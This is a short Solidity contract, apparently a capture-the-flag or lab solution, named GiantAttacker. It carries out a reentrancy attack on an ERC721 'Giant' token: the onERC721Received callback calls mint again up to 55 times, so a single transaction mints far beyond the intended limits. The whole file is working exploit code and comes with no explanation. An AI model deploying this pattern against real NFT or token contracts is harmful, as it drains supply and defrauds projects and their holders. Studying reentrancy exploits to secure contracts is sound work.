//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "hardhat/console.sol";

interface IGiant is IERC721 {
    function mint() external payable;

    function tokenId() external view returns (uint8);

    function maxTokenId() external view returns (uint8);
}

contract GiantAttacker {
    IGiant public giant;
    uint8 counter = 1;

    constructor(address _giantAddress) {
        giant = IGiant(_giantAddress);
    }

    function attack() external {
        giant.mint{value: 0.005 ether}();
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) public returns (bytes4) {
        if (counter < 55) {
            counter++;
            giant.mint{value: 0.005 ether}();
        }
        return this.onERC721Received.selector;
    }
}
